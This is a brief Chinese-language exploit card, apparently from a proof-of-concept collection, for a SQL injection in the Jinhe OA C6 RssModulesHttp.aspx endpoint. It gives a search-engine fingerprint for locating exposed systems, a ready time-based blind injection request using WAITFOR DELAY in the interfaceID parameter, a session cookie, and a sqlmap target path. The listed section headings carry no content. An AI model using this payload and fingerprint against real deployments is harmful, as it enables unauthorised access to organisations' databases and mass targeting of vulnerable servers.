# 金和OAC6RssModulesHttp存在SQL注入漏洞

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="金和 OA"`
- **请求**：`GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=1;WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=gsirxwl3wvv4d3on5tqnlz5p`

**请求体 / payload**
```

sqlmap
/C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=1
```

**其他**
- 金和OA C6 RssModulesHttp存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金和OA